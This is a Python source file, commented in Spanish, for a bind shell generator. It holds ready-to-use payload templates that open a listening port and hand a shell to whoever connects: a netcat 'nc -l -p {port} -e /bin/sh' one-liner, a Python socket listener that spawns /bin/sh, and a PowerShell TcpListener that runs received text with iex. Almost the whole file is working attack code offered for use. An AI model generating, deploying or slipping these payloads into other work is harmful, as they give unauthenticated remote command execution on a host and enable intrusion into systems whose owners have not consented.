"""Generador de bind shells en múltiples lenguajes."""

from dataclasses import dataclass


@dataclass
class BindShell:
    """Resultado de una generación de bind shell."""
    language: str
    port: int
    payload: str


class BindShellGenerator:
    """Genera bind shells para diferentes lenguajes."""

    TEMPLATES: dict[str, str] = {
        "bash": (
            "nc -l -p {port} -e /bin/sh\n"
        ),
        "python": (
            "import socket,subprocess,os\n"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\n"
            "s.bind(('0.0.0.0',{port}))\n"
            "s.listen(1)\n"
            "conn,addr=s.accept()\n"
            "os.dup2(conn.fileno(),0)\nos.dup2(conn.fileno(),1)\n"
            "os.dup2(conn.fileno(),2)\n"
            "subprocess.call(['/bin/sh','-i'])\n"
        ),
        "powershell": (
            "$listener=New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});"
            "$listener.Start();"
            "while($true){{"
            "$client=$listener.AcceptTcpClient();"
            "$stream=$client.GetStream();"
            "[byte[]]$bytes=0..65535|%{{0}};"
            "while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0)"
            "{{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            "$sendback=(iex $data 2>&1|Out-String);"
            "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}}}\n"
        ),
        "netcat": (
            "nc -l -p {port} -e /bin/sh\n"
        ),
    }

    def generate(self, language: str, port: int) -> BindShell:
        language = language.lower()
        template = self.TEMPLATES.get(language)
        if not template:
            raise ValueError(
                f"Lenguaje no soportado para bind shell: {language}. "
                f"Disponibles: {', '.join(self.TEMPLATES.keys())}"
            )
        payload = template.format(port=port)
        return BindShell(language=language, port=port, payload=payload)

    def list_languages(self) -> list[str]:
        return list(self.TEMPLATES.keys())
